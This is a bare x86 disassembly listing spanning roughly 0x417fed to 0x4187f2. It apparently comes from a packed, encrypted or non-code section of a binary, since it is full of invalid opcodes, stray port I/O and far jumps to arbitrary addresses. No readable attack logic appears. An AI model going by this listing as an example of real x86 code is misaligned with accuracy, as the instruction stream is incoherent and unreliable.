  417fed:	pop    ebp
  417fee:	sahf   
  417fef:	xor    BYTE PTR [eax-0x3b],cl
  417ff2:	adc    eax,0xeaa097cb
  417ff7:	sbb    eax,0x313ea929
  417ffc:	sub    eax,0x72be3625
  418001:	jle    0x418044
  418003:	cwde   
  418004:	jno    0x417fc8
  418006:	mov    ds:0x85036ca1,ax
  41800c:	mov    DWORD PTR [edi],edx
  41800e:	pop    es
  41800f:	pop    esi
  418010:	mov    ch,0xc8
  418012:	add    BYTE PTR ds:0x8a5997d6,cl
  418018:	mul    DWORD PTR [esi-0x11]
  41801b:	shl    BYTE PTR ds:0x67b682d3,cl
  418021:	ror    BYTE PTR [ebx-0x5839be82],cl
  418027:	nop
  418028:	add    DWORD PTR [ebx+esi*4],ecx
  41802b:	mov    ds:0xb4824802,eax
  418031:	fisubr DWORD PTR [edi]
  418033:	mov    DWORD PTR [edi],ebx
  418035:	std    
  418036:	popa   
  418037:	xor    DWORD PTR [esi],ecx
  418039:	mov    eax,0xa4f85d07
  41803e:	jb     0x41805c
  418040:	cli    
  418041:	enter  0xeb41,0xf3
  418045:	lods   eax,DWORD PTR ds:[esi]
  418046:	nop
  418047:	jp     0x41803c
  418049:	add    BYTE PTR [ebp-0x30],bl
  41804c:	dec    ebp
  41804d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41804e:	push   ds
  41804f:	xchg   edx,eax
  418050:	scas   eax,DWORD PTR es:[edi]
  418051:	xchg   BYTE PTR [ebp+eiz*1+0x5158f5c7],bh
  418058:	out    0x89,eax
  41805a:	pushf  
  41805b:	cmp    bl,dh
  41805d:	aad    0xef
  41805f:	shr    DWORD PTR [eax],0xdf
  418062:	test   eax,0xf32ab7ac
  418067:	in     al,0xfb
  418069:	sub    BYTE PTR [edx+0x19],ch
  41806c:	out    0x1c,al
  41806e:	lods   al,BYTE PTR ds:[esi]
  41806f:	and    BYTE PTR [esi+0x6a],dh
  418072:	inc    eax
  418073:	inc    edx
  418074:	cmp    DWORD PTR [edx+edi*2],eax
  418077:	stc    
  418078:	retf   
  418079:	scas   eax,DWORD PTR es:[edi]
  41807a:	sub    ecx,edi
  41807c:	popf   
  41807d:	sbb    eax,0x4b7776db
  418082:	fxch   st(0)
  418084:	inc    DWORD PTR [eax+0x4c]
  418087:	fisub  WORD PTR [ecx]
  418089:	ja     0x418091
  41808b:	or     al,cl
  41808d:	lods   eax,DWORD PTR ds:[esi]
  41808e:	rol    DWORD PTR [eax+0x6bbb9b3c],0x93
  418095:	dec    bl
  418097:	mov    dl,0x44
  418099:	cmp    BYTE PTR [ecx-0x45a247b7],dl
  41809f:	dec    edi
  4180a0:	sbb    eax,esp
  4180a2:	add    al,0xca
  4180a4:	cmp    BYTE PTR [ebx-0x8a4cf48],ah
  4180aa:	test   eax,0xa1567c19
  4180af:	push   ebp
  4180b0:	or     al,0x3a
  4180b2:	adc    al,0x88
  4180b4:	xor    eax,0x28e9f19
  4180b9:	icebp  
  4180ba:	shl    DWORD PTR [ebp+0x4a14f6ec],0x8a
  4180c1:	dec    ebp
  4180c2:	mov    es,esi
  4180c4:	push   cs
  4180c5:	mov    BYTE PTR [ebp+0x31524529],bl
  4180cb:	jmp    0x7eee:0x339d80cb
  4180d2:	pop    ebx
  4180d3:	or     BYTE PTR [edi-0xfac8d82],ch
  4180d9:	neg    BYTE PTR [ecx-0x6c]
  4180dc:	jmp    0x5ea1:0x718ab57
  4180e3:	(bad)  
  4180e5:	(bad)  
  4180e6:	(bad)  
  4180e7:	fcomp  QWORD PTR [ecx-0xb]
  4180ea:	xchg   esp,eax
  4180eb:	nop
  4180ec:	fdiv   DWORD PTR [esi+eax*2]
  4180ef:	mov    bl,0x41
  4180f1:	mov    eax,0xea125db3
  4180f6:	mov    al,ds:0x322404b
  4180fb:	test   DWORD PTR [esi-0x6f247783],0x7639b378
  418105:	stos   DWORD PTR es:[edi],eax
  418106:	ins    BYTE PTR es:[edi],dx
  418107:	inc    esp
  418108:	hlt    
  418109:	xchg   edi,eax
  41810a:	pop    esp
  41810b:	neg    eax
  41810d:	mov    edx,0x30b728f5
  418112:	push   0xdfe42142
  418117:	push   ebp
  418118:	push   0x32aed0f5
  41811d:	jg     0x4180d5
  41811f:	pushf  
  418120:	imul   edx,DWORD PTR [ebx],0x7c861afe
  418126:	(bad)  
  418127:	lahf   
  418128:	and    eax,0x2ac9c29
  41812d:	mov    fs,WORD PTR [ebx]
  41812f:	fsubr  DWORD PTR [ebx+0x57ea0f7]
  418135:	(bad)  
  418136:	into   
  418137:	or     DWORD PTR [eax+0xd],edx
  41813a:	or     DWORD PTR [edx],0x49dea19c
  418140:	retf   0x5741
  418143:	adc    eax,0x26ae4a4b
  418148:	cmp    eax,DWORD PTR [ebx]
  41814a:	jne    0x418148
  41814c:	dec    eax
  41814d:	test   al,0xd1
  41814f:	addr16 push ds
  418151:	pop    ebx
  418152:	mov    ds:0x18f2767a,eax
  418157:	sbb    al,0x13
  418159:	cmc    
  41815a:	push   es
  41815b:	pop    edx
  41815c:	daa    
  41815d:	xor    eax,0xc816f709
  418162:	iret   
  418163:	test   eax,0xba2ea609
  418168:	mov    ds:0xb567f0c3,al
  41816d:	mov    al,ds:0x39932fe7
  418172:	or     dh,BYTE PTR [esi+0xd]
  418175:	mov    edx,fs
  418177:	inc    edi
  418178:	stos   BYTE PTR es:[edi],al
  418179:	fcomp  QWORD PTR [edi+ebp*4]
  41817c:	dec    esp
  41817d:	push   esp
  41817e:	fistp  WORD PTR [edx+0x72cf8156]
  418184:	ret    
  418185:	cmp    al,0x33
  418187:	lods   al,BYTE PTR ds:[esi]
  418188:	aaa    
  418189:	pop    ds
  41818a:	push   0x9e89893f
  41818f:	pop    ss
  418190:	and    BYTE PTR [ebx+0x4ef8f8fa],0xfe
  418197:	aam    0x92
  418199:	bound  esi,QWORD PTR [ebx-0x79c5e54e]
  41819f:	mov    esi,DWORD PTR [eax-0x80]
  4181a2:	mov    cl,0x78
  4181a4:	int3   
  4181a5:	retf   
  4181a6:	or     ebx,DWORD PTR ss:0x7f871389
  4181ad:	pushf  
  4181ae:	and    edi,DWORD PTR [ebx]
  4181b0:	mov    ah,0xd4
  4181b2:	cmp    al,0x8e
  4181b4:	dec    ecx
  4181b5:	pop    esp
  4181b6:	cmp    DWORD PTR [edi+eiz*4+0x5c4df312],ebp
  4181bd:	rol    DWORD PTR [esi],1
  4181bf:	mov    ds:0x73d96b49,al
  4181c4:	sub    al,BYTE PTR [esi]
  4181c6:	imul   edx,DWORD PTR [esi-0x39a55794],0x13b9d803
  4181d0:	std    
  4181d1:	mov    cl,0xae
  4181d3:	scas   eax,DWORD PTR es:[edi]
  4181d4:	xor    bl,bh
  4181d6:	popa   
  4181d7:	shr    eax,1
  4181d9:	sub    esi,DWORD PTR [ecx+0x40]
  4181dc:	add    eax,0xc4f14c1
  4181e1:	int    0xee
  4181e3:	mov    ds:0xc41188d3,al
  4181e8:	ret    
  4181e9:	jae    0x41821c
  4181eb:	adc    al,0xd8
  4181ed:	addr16 sub eax,0x7d08a81a
  4181f3:	and    al,0x53
  4181f5:	sti    
  4181f6:	or     esi,ecx
  4181f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f9:	out    0xd3,al
  4181fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181fc:	sbb    DWORD PTR [ebx-0x7f7eac4b],ecx
  418202:	sub    ecx,esi
  418204:	push   cs
  418205:	mov    al,ds:0xb5cb7164
  41820a:	int3   
  41820b:	xor    dh,BYTE PTR [esi-0x50]
  41820e:	mov    WORD PTR [eax],fs
  418210:	sahf   
  418211:	inc    DWORD PTR [esi-0x39719c58]
  418217:	dec    eax
  418218:	in     al,dx
  418219:	out    dx,eax
  41821a:	(bad)  
  41821b:	lods   al,BYTE PTR ds:[esi]
  41821c:	(bad)  
  41821d:	das    
  41821e:	out    dx,al
  41821f:	clc    
  418220:	add    dl,BYTE PTR [edi]
  418222:	xor    eax,0x1b9ec8d8
  418227:	fcom   DWORD PTR ds:0x91bd60b2
  41822d:	sahf   
  41822e:	shl    BYTE PTR [ebx],1
  418230:	stos   BYTE PTR es:[edi],al
  418231:	xchg   ecx,ebx
  418233:	sahf   
  418234:	nop
  418235:	int3   
  418236:	nop
  418237:	in     al,dx
  418238:	xchg   ecx,eax
  418239:	adc    BYTE PTR [esi+0x4607240e],bh
  41823f:	inc    ebx
  418240:	rcr    BYTE PTR [esi],0xaf
  418243:	inc    esp
  418244:	or     eax,0x8d2fb5b9
  418249:	xchg   esp,eax
  41824a:	xor    al,0xf
  41824c:	cmp    edx,esi
  41824e:	pop    ebx
  41824f:	ds jnp 0x4181de
  418252:	dec    edi
  418253:	xchg   DWORD PTR [edi+0x58],esp
  418256:	push   eax
  418257:	jmp    0x91481e2a
  41825c:	and    al,0x6e
  41825e:	stos   BYTE PTR es:[edi],al
  41825f:	test   al,0xca
  418261:	push   ds
  418262:	shr    BYTE PTR [eax+0x56c5cd88],cl
  418268:	add    al,0x8e
  41826a:	cli    
  41826b:	jbe    0x418282
  41826d:	sbb    ah,bh
  41826f:	std    
  418270:	ja     0x4182d1
  418272:	cmp    DWORD PTR [ebx-0x4b],edi
  418275:	aam    0xf6
  418277:	or     ch,0x5e
  41827a:	add    dh,BYTE PTR [edi-0x77516622]
  418280:	mov    bh,0x2e
  418282:	jb     0x4182ed
  418284:	mov    edi,0xe2f01a5b
  418289:	mov    dh,0x47
  41828b:	push   0x10
  41828d:	jo     0x41823f
  41828f:	or     al,0xbb
  418291:	int    0x4c
  418293:	aaa    
  418294:	dec    ecx
  418295:	sub    DWORD PTR [ecx+0x7873abe1],esp
  41829b:	cmp    DWORD PTR [esi],edx
  41829d:	xor    ecx,DWORD PTR [eax-0x79104d23]
  4182a3:	sti    
  4182a4:	push   0x6d0cc959
  4182a9:	in     eax,dx
  4182aa:	in     al,dx
  4182ab:	ins    BYTE PTR es:[edi],dx
  4182ac:	mov    ebx,DWORD PTR [edi+eax*4]
  4182af:	pop    edi
  4182b0:	fisttp DWORD PTR [edi-0x7a]
  4182b3:	aam    0xb1
  4182b5:	pop    ecx
  4182b6:	test   al,0x4a
  4182b8:	repnz test eax,0xfda464fb
  4182be:	xchg   ebp,eax
  4182bf:	and    al,0xa6
  4182c1:	xchg   ecx,ecx
  4182c3:	xchg   BYTE PTR [ecx-0x189a421a],ah
  4182c9:	add    al,0xa5
  4182cb:	adc    al,0x9f
  4182cd:	mov    WORD PTR [eax-0x364d479],gs
  4182d3:	jle    0x41833d
  4182d5:	fiadd  DWORD PTR [ebx+0x46]
  4182d8:	jns    0x41834f
  4182da:	xor    BYTE PTR [edi],al
  4182dc:	sbb    DWORD PTR cs:[eax-0x1cb81f93],eax
  4182e3:	pop    edx
  4182e4:	aaa    
  4182e5:	adc    DWORD PTR [esi],eax
  4182e7:	ficom  DWORD PTR [ebx+0x5cb3c661]
  4182ed:	mov    ah,0x95
  4182ef:	inc    edx
  4182f0:	fwait
  4182f1:	sbb    dh,dh
  4182f3:	xchg   esp,eax
  4182f4:	mov    al,0x75
  4182f6:	mov    bl,BYTE PTR [ebp-0x76e36ad7]
  4182fc:	add    al,0x6
  4182fe:	rcl    DWORD PTR [esi],cl
  418300:	lds    ecx,FWORD PTR [ecx-0x48548f50]
  418306:	push   0x696eb57f
  41830b:	in     al,dx
  41830c:	sbb    BYTE PTR [edx],cl
  41830e:	pop    eax
  41830f:	dec    esi
  418310:	dec    esi
  418311:	jo     0x418390
  418313:	test   eax,0xd6d5e62a
  418318:	ror    DWORD PTR ds:0xd4466d2b,0x2f
  41831f:	scas   eax,DWORD PTR es:[edi]
  418320:	and    ebp,DWORD PTR [ebp-0x4a]
  418323:	mov    esi,0xc2814ba
  418328:	addr16 loop 0x41835b
  41832b:	sar    eax,0x31
  41832e:	jne    0x41831c
  418330:	adc    DWORD PTR [eax-0x5992d190],esp
  418336:	arpl   WORD PTR [esi*2-0x5ff185ba],ax
  41833d:	mov    edx,0x323a7013
  418342:	sub    DWORD PTR [eax],esi
  418344:	mov    cl,0xf2
  418346:	cmp    BYTE PTR [ebx],bh
  418348:	(bad)  
  418349:	push   edx
  41834a:	(bad)  
  41834b:	or     cl,BYTE PTR [ecx]
  41834d:	inc    esp
  41834e:	jle    0x418335
  418350:	cmp    DWORD PTR [eax+0x4c],edi
  418353:	sar    bh,1
  418355:	cdq    
  418356:	and    DWORD PTR [esi],edi
  418358:	inc    esi
  418359:	out    0xb5,eax
  41835b:	push   ss
  41835c:	mov    ah,0xca
  41835e:	xchg   ebx,eax
  41835f:	cli    
  418360:	imul   ebx,edi,0xffffff85
  418363:	mov    ebx,0x970c312f
  418368:	sub    dl,BYTE PTR [eax-0x67]
  41836b:	and    eax,0xdb83051f
  418370:	(bad)  
  418371:	mov    ah,0xc4
  418374:	int    0xf5
  418376:	add    al,0x14
  418378:	out    0x9c,al
  41837a:	mov    eax,ds:0xa15b1421
  41837f:	les    edi,FWORD PTR [edx+0x2b59e8e]
  418385:	mov    gs,WORD PTR [ecx+ebp*8]
  418388:	jecxz  0x4183b9
  41838a:	sub    ebp,esi
  41838c:	and    esp,ebp
  41838e:	(bad)  
  41838f:	dec    esp
  418390:	and    BYTE PTR [edi],0x39
  418393:	dec    ebx
  418394:	mov    dl,0xa4
  418396:	clc    
  418397:	mov    al,ds:0xa8d51cf
  41839c:	rcl    BYTE PTR [edi+0x38],0x5b
  4183a0:	mov    ebp,0x8397cba4
  4183a5:	mov    ebx,0xa2ecc7d6
  4183aa:	mov    dh,bh
  4183ac:	add    BYTE PTR [ebx],ah
  4183ae:	mov    cl,0x39
  4183b0:	pop    ds
  4183b1:	sub    al,0x54
  4183b3:	xchg   edi,esp
  4183b5:	xlat   BYTE PTR ds:[ebx]
  4183b6:	scas   eax,DWORD PTR es:[edi]
  4183b7:	pop    ss
  4183b8:	cmp    esp,ebx
  4183ba:	(bad)  
  4183bb:	dec    edx
  4183bc:	ins    BYTE PTR es:[edi],dx
  4183bd:	iret   
  4183be:	push   cs
  4183bf:	addr16 pop es
  4183c1:	retf   
  4183c2:	jp     0x418396
  4183c4:	mov    ds:0xc8fbcc4a,eax
  4183c9:	sbb    al,ah
  4183cb:	fs aad 0xf8
  4183ce:	push   cs
  4183cf:	lods   eax,DWORD PTR ds:[esi]
  4183d0:	neg    BYTE PTR [edi]
  4183d2:	arpl   WORD PTR [ebp+0x75bc3c30],ax
  4183d8:	stos   DWORD PTR es:[edi],eax
  4183d9:	mov    DWORD PTR [edi],ecx
  4183db:	shr    DWORD PTR [ecx+0x66],1
  4183de:	push   esi
  4183df:	mov    dh,0x9d
  4183e1:	lahf   
  4183e2:	ror    ah,0x9a
  4183e5:	in     al,0x3
  4183e7:	xchg   ecx,eax
  4183e8:	(bad)  
  4183e9:	in     al,0x6
  4183eb:	ins    DWORD PTR es:[edi],dx
  4183ec:	add    bh,BYTE PTR [esp+ebp*4]
  4183ef:	adc    eax,0x21a210c5
  4183f4:	dec    edx
  4183f5:	xor    al,0x14
  4183f7:	inc    esp
  4183f8:	xchg   ebp,eax
  4183f9:	hlt    
  4183fa:	sbb    edx,DWORD PTR [eax-0x63f01ec0]
  418400:	addr16 addr16 in al,dx
  418403:	aas    
  418404:	sti    
  418405:	sub    esp,DWORD PTR [eax]
  418407:	popf   
  418408:	jmp    0x4183ae
  41840a:	sub    ebp,DWORD PTR [eax+ebx*8-0x5d]
  41840e:	into   
  41840f:	pusha  
  418410:	mov    WORD PTR [esp+ebp*2],fs
  418413:	fisttp WORD PTR [esi+0x48bd6538]
  418419:	mov    esi,0xd17efb26
  41841e:	or     al,0xd2
  418420:	aas    
  418421:	inc    edi
  418422:	imul   esi,DWORD PTR [esp+ebx*2],0x20
  418426:	cmp    eax,0xc9c9169a
  41842b:	jns    0x418484
  41842d:	dec    ebx
  41842e:	pop    ebp
  41842f:	mov    ah,0x2f
  418431:	push   edx
  418432:	rcl    BYTE PTR [edi-0x25],1
  418435:	add    BYTE PTR [esi-0x5e29c87f],bl
  41843b:	sub    edi,DWORD PTR [ecx-0x5f2320c]
  418441:	sub    BYTE PTR [edi+0x39],ch
  418444:	mov    ebp,0x38ca06d1
  418449:	jmp    0x418403
  41844b:	and    al,BYTE PTR [ebp-0x3e]
  41844e:	aad    0x8c
  418450:	rol    BYTE PTR ds:0xde4e9bec,0x41
  418457:	pop    ebp
  418458:	fsubr  QWORD PTR [ebx+0x584629e6]
  41845e:	or     al,0x55
  418460:	popf   
  418461:	jmp    0xe9a5:0x996694b3
  418468:	sbb    BYTE PTR [ecx-0x41],dl
  41846b:	sbb    ebx,DWORD PTR [eax-0x7f]
  41846e:	repnz mov ebx,cs
  418471:	imul   ebx,DWORD PTR [ecx-0x57],0x23
  418475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418476:	mov    al,ds:0xa0b1ede5
  41847b:	xor    DWORD PTR [edx*4+0x62cd1c9f],eax
  418482:	sti    
  418483:	adc    dl,BYTE PTR [ecx-0x49]
  418486:	shl    DWORD PTR [eax+0x26c187f9],cl
  41848c:	cmp    edx,DWORD PTR [edi+0x4]
  41848f:	test   eax,0x4d719e7b
  418494:	cli    
  418495:	and    esi,DWORD PTR [ebx]
  418497:	and    al,0x3d
  418499:	stc    
  41849a:	dec    edx
  41849b:	data16 sub al,0x19
  41849e:	(bad)  
  41849f:	in     eax,dx
  4184a0:	push   ebp
  4184a1:	jbe    0x4184c9
  4184a3:	pop    eax
  4184a4:	mov    bl,0x4
  4184a6:	push   es
  4184a7:	adc    edi,edx
  4184a9:	and    al,BYTE PTR [esi-0x6f]
  4184ac:	xchg   esp,eax
  4184ad:	and    edx,DWORD PTR [esi+esi*8+0x19b388df]
  4184b4:	add    cl,BYTE PTR [eax]
  4184b6:	mov    cl,0x69
  4184b8:	push   ebp
  4184b9:	(bad)  
  4184ba:	mov    ah,0x36
  4184bc:	retf   0x460d
  4184bf:	and    eax,0x2d44f4
  4184c4:	pop    ss
  4184c5:	js     0x4184f4
  4184c7:	xchg   BYTE PTR [esi-0x7a1e3e1e],bh
  4184cd:	test   BYTE PTR [ecx],0x52
  4184d0:	std    
  4184d1:	mov    cl,0xe9
  4184d3:	loop   0x418476
  4184d5:	lods   eax,DWORD PTR ds:[esi]
  4184d6:	pop    edx
  4184d7:	mov    bl,0x93
  4184d9:	cmp    DWORD PTR [esi],ebx
  4184db:	dec    esi
  4184dc:	call   0xece3:0xc20ad381
  4184e3:	adc    ah,dh
  4184e5:	xor    al,0xb4
  4184e7:	js     0x41851f
  4184e9:	icebp  
  4184ea:	fcmove st,st(5)
  4184ec:	iret   
  4184ed:	sbb    DWORD PTR [ebx-0x10],eax
  4184f0:	jle    0x41849e
  4184f2:	cmp    BYTE PTR [edx+0x26e37d84],0x6
  4184f9:	xor    ebp,DWORD PTR [esi]
  4184fb:	jbe    0x418499
  4184fd:	stc    
  4184fe:	fist   WORD PTR [eax-0x16ac5427]
  418504:	cmc    
  418505:	add    al,0x4e
  418507:	adc    eax,0x4fa32294
  41850c:	stos   DWORD PTR es:[edi],eax
  41850d:	sbb    eax,0x7c4d89f6
  418512:	cmp    ebx,DWORD PTR [ebp-0x48]
  418515:	adc    ebx,DWORD PTR [esi-0x14b400a4]
  41851b:	adc    al,0xb0
  41851d:	or     DWORD PTR [esi+ebx*4-0x3c2b9dcd],edx
  418524:	sub    al,0xa3
  418526:	scas   al,BYTE PTR es:[edi]
  418527:	and    ebp,DWORD PTR [edx+edx*1]
  41852a:	data16 or al,0x65
  41852d:	jg     0x4185a7
  41852f:	dec    edx
  418530:	test   al,0x11
  418532:	mov    ebx,0x7f075787
  418537:	dec    eax
  418538:	inc    ebp
  418539:	xor    BYTE PTR [edi+eiz*8+0x12],cl
  41853d:	sti    
  41853e:	inc    eax
  41853f:	cs sbb bh,dh
  418542:	mov    bh,0xa0
  418544:	adc    al,BYTE PTR [esi-0x59]
  418547:	pusha  
  418548:	bound  ebp,QWORD PTR cs:[ecx+edx*8]
  41854c:	nop
  41854d:	lea    ebp,[eax-0x47]
  418550:	mov    ch,BYTE PTR [ebx+0x2f65d04]
  418556:	mov    dl,0x72
  418558:	push   edi
  418559:	jecxz  0x418570
  41855b:	or     esi,edx
  41855d:	inc    ebp
  41855e:	out    0x6c,al
  418560:	lea    esi,[edi]
  418562:	(bad)  
  418563:	mul    cl
  418565:	sub    al,0x78
  418567:	cmp    BYTE PTR [eiz*1-0x24c3b47c],bl
  41856e:	sahf   
  41856f:	sbb    BYTE PTR [ecx+ebx*4+0x29],0x33
  418574:	add    DWORD PTR [ebx-0x52],esi
  418577:	or     al,BYTE PTR [eax-0x7c9f477c]
  41857d:	mov    ebp,0xd388c1e5
  418582:	aaa    
  418583:	shr    BYTE PTR [esi+0x5e],1
  418586:	mov    esi,0x8564bcc0
  41858b:	mov    ch,0x79
  41858d:	and    al,0xb5
  41858f:	add    BYTE PTR [edi],bh
  418591:	ret    0x30ef
  418594:	scas   al,BYTE PTR es:[edi]
  418595:	hlt    
  418596:	sub    DWORD PTR [edx-0x3d],ecx
  418599:	jno    0x418521
  41859b:	sbb    ah,BYTE PTR [ebx-0x5c]
  41859e:	sbb    al,0xa8
  4185a0:	xchg   esi,eax
  4185a1:	mov    bh,0x6e
  4185a3:	add    BYTE PTR [edx-0x7eee1a27],al
  4185a9:	push   0xffffffdc
  4185ab:	inc    ebp
  4185ac:	lods   eax,DWORD PTR ds:[esi]
  4185ad:	rcr    bl,1
  4185af:	data16 cli 
  4185b1:	inc    esp
  4185b2:	addr16 dec edi
  4185b4:	push   0x7d76e37b
  4185b9:	je     0x4185ed
  4185bb:	retf   
  4185bc:	pusha  
  4185bd:	cmp    DWORD PTR [esi+0x51],edi
  4185c0:	ficom  WORD PTR [ecx+0x71]
  4185c3:	push   es
  4185c4:	addr16 and dl,ch
  4185c7:	sahf   
  4185c8:	fnstcw WORD PTR [ebp-0x2599583]
  4185ce:	loope  0x418644
  4185d0:	stos   BYTE PTR es:[edi],al
  4185d1:	sub    bl,ah
  4185d3:	mov    ecx,0xa53123a3
  4185d8:	bound  esi,QWORD PTR [eax+edi*8+0x3fe7fd5e]
  4185df:	scas   eax,DWORD PTR es:[edi]
  4185e0:	pop    esp
  4185e1:	pop    edx
  4185e2:	scas   al,BYTE PTR es:[edi]
  4185e3:	fld    DWORD PTR [edi+0x201f618b]
  4185e9:	xchg   ecx,eax
  4185ea:	jnp    0x418618
  4185ec:	fucomp st(3)
  4185ee:	dec    ebp
  4185ef:	call   0x2c485174
  4185f4:	dec    edi
  4185f5:	push   edi
  4185f6:	cmc    
  4185f7:	mov    esp,0xa7b41a6d
  4185fc:	xor    ebx,edx
  4185fe:	sbb    dh,BYTE PTR [eax+0x38675ea3]
  418604:	gs inc ecx
  418606:	(bad)
  418609:	pop    ds
  41860a:	add    DWORD PTR [edi+0x5df674d3],ebp
  418610:	dec    ebx
  418611:	dec    ebx
  418612:	pop    ebx
  418613:	sti    
  418614:	test   BYTE PTR [ebx-0x7dbf1061],0x14
  41861b:	test   esp,esi
  41861d:	mov    ch,0x1e
  41861f:	push   esp
  418620:	out    0xd4,al
  418622:	shl    BYTE PTR [edi],1
  418624:	dec    esp
  418625:	mov    edi,0x74d054b6
  41862a:	push   es
  41862b:	repz int 0x1
  41862e:	xor    DWORD PTR [esi-0x13940bf7],edx
  418634:	adc    eax,DWORD PTR ds:0xeedac3d6
  41863a:	std    
  41863b:	mov    ds:0xf6800a9c,eax
  418640:	jmp    0x7434bb7d
  418645:	inc    ecx
  418646:	mov    cx,cx
  418649:	cmp    BYTE PTR [eax-0x19],al
  41864c:	xchg   edx,esi
  41864e:	js     0x41869a
  418650:	jg     0x41866d
  418652:	ins    DWORD PTR es:[edi],dx
  418653:	leave  
  418654:	fld    TBYTE PTR [edi+0x3f]
  418657:	pop    ss
  418658:	add    al,0xf9
  41865a:	sub    eax,0xdc7f5637
  41865f:	hlt    
  418660:	mov    dl,0xb5
  418662:	repz not BYTE PTR fs:[esi]
  418666:	mov    cl,0x20
  418668:	mov    ebp,0x337f5017
  41866d:	retf   
  41866e:	and    edi,ebp
  418670:	call   0xc3bbb32d
  418675:	jg     0x4185fb
  418677:	mov    ds:0x3e242b31,al
  41867c:	add    eax,0x467b0b07
  418681:	lock fnstenv [ebp-0x5d69b615]
  418688:	in     eax,0x1a
  41868a:	test   ah,bl
  41868c:	fild   DWORD PTR [esi-0x138c2e90]
  418692:	xlat   BYTE PTR ds:[ebx]
  418693:	mov    esi,DWORD PTR [ecx+0x78e42673]
  418699:	aam    0x70
  41869b:	addr16 iret 
  41869d:	in     al,0xe9
  41869f:	mov    al,0x79
  4186a1:	ret    
  4186a2:	fdiv   QWORD PTR [ebp-0x2eda15f]
  4186a8:	push   edx
  4186a9:	fisttp WORD PTR [edx]
  4186ab:	push   eax
  4186ac:	xchg   ebx,eax
  4186ad:	fucom  st(0)
  4186af:	lahf   
  4186b0:	and    BYTE PTR [esi+0x38],dl
  4186b3:	mov    cl,0x39
  4186b6:	out    dx,al
  4186b7:	mov    ah,0xa6
  4186b9:	add    al,0x58
  4186bb:	idiv   BYTE PTR [edx]
  4186bd:	and    DWORD PTR [ebp-0x1392270],ecx
  4186c3:	pushf  
  4186c4:	and    cl,ah
  4186c6:	stc    
  4186c7:	jns    0x41865b
  4186c9:	push   ebx
  4186ca:	pop    esi
  4186cb:	test   DWORD PTR ds:0x5ebfeafd,eax
  4186d1:	les    ebx,FWORD PTR [esp+ebx*8]
  4186d4:	adc    eax,0x3ed020fd
  4186d9:	mov    eax,ds:0x9500ecdc
  4186de:	inc    eax
  4186df:	fucomp st(6)
  4186e1:	loope  0x4186d0
  4186e3:	mov    cl,0x83
  4186e5:	jg     0x4186ee
  4186e7:	pop    eax
  4186e8:	int    0x94
  4186ea:	xlat   BYTE PTR ds:[ebx]
  4186eb:	scas   al,BYTE PTR es:[edi]
  4186ec:	pop    es
  4186ed:	(bad)  
  4186ee:	loopne 0x418765
  4186f0:	in     al,0x2d
  4186f2:	out    dx,al
  4186f3:	loopne 0x4186a9
  4186f5:	fs in  eax,0xf1
  4186f8:	adc    eax,0xe0376a98
  4186fd:	pop    es
  4186fe:	mov    ebp,0x74163036
  418703:	fbld   TBYTE PTR [ebp+0x5d]
  418706:	fsubr  DWORD PTR [ecx+0x3c2d85bb]
  41870c:	or     al,0xe9
  41870e:	jl     0x4186c8
  418710:	bswap  ecx
  418712:	fdiv   QWORD PTR ds:0x197f82ef
  418718:	ins    DWORD PTR es:[edi],dx
  418719:	mov    esp,0x8ee0d1ac
  41871e:	jne    0x4186bc
  418720:	lods   al,BYTE PTR ds:[esi]
  418721:	sbb    BYTE PTR [ebx+0xf],bh
  418724:	inc    ebx
  418725:	cmp    ebx,DWORD PTR [eax+0xdeaeed4]
  41872b:	mov    WORD PTR [ebx],cs
  41872d:	stos   BYTE PTR es:[edi],al
  41872e:	call   0xa84e:0x786bdc0e
  418735:	sub    eax,0xc307e900
  41873a:	lock mov al,0x33
  41873d:	and    al,ch
  41873f:	repz out dx,eax
  418741:	aas    
  418742:	mov    esp,DWORD PTR [ebx+esi*4+0x38]
  418746:	xor    eax,DWORD PTR [edi]
  418748:	stos   DWORD PTR es:[edi],eax
  418749:	or     eax,0x382b584f
  41874e:	sub    eax,0x256e3c01
  418753:	out    0xdc,al
  418755:	push   es
  418756:	inc    eax
  418757:	push   eax
  418758:	push   edi
  418759:	push   ss
  41875a:	mov    dl,0x1
  41875c:	cmp    BYTE PTR [eax],dh
  41875e:	call   0x64aea508
  418763:	cmp    dl,BYTE PTR [eax+0x606d9a5b]
  418769:	out    0x9a,eax
  41876b:	hlt    
  41876c:	xchg   esi,eax
  41876d:	and    al,0xad
  41876f:	out    0x7e,al
  418771:	imul   esp,DWORD PTR [eax+0xa],0xffffffa1
  418775:	cmp    eax,DWORD PTR [eax-0x57]
  418778:	outs   dx,BYTE PTR ds:[esi]
  418779:	test   BYTE PTR [edx],cl
  41877b:	jmp    0x4291:0x3dae4f5c
  418782:	shl    DWORD PTR [ebx-0x77],0xef
  418786:	fnstsw WORD PTR [ecx-0x26ee76af]
  41878c:	gs add bl,bl
  41878f:	es int3 
  418791:	aad    0xc6
  418793:	xlat   BYTE PTR ds:[ebx]
  418794:	fild   DWORD PTR [esi-0x3663ec6b]
  41879a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41879b:	mov    edx,0x23e33b4f
  4187a0:	push   edx
  4187a1:	add    DWORD PTR [ebp+0x2f],esp
  4187a4:	xlat   BYTE PTR ds:[ebx]
  4187a5:	pop    edx
  4187a6:	std    
  4187a7:	push   ss
  4187a8:	int3   
  4187a9:	(bad)
  4187ad:	(bad)  
  4187ae:	and    dh,dl
  4187b0:	in     eax,dx
  4187b1:	enter  0xe729,0xa6
  4187b5:	int3   
  4187b6:	mov    dl,0x35
  4187b8:	not    esp
  4187ba:	inc    esp
  4187bb:	mov    ebp,0x700a1634
  4187c0:	shl    edx,1
  4187c2:	stos   BYTE PTR es:[edi],al
  4187c3:	pop    ebp
  4187c4:	sub    al,0xd8
  4187c6:	jnp    0x41883b
  4187c8:	jno    0x41876b
  4187ca:	push   esi
  4187cb:	sbb    ecx,DWORD PTR [eax-0x303cd476]
  4187d1:	mov    ebx,DWORD PTR [edx]
  4187d3:	sbb    BYTE PTR [esi+0xe22cc0],cl
  4187d9:	inc    BYTE PTR [edi+0x71e19325]
  4187df:	inc    ebx
  4187e0:	repnz dec eax
  4187e2:	enter  0x9d95,0x95
  4187e6:	pop    DWORD PTR [edx-0x76aabe2f]
  4187ec:	mov    esi,0x349e9544
  4187f1:	push   esi
  4187f2:	inc    ecx
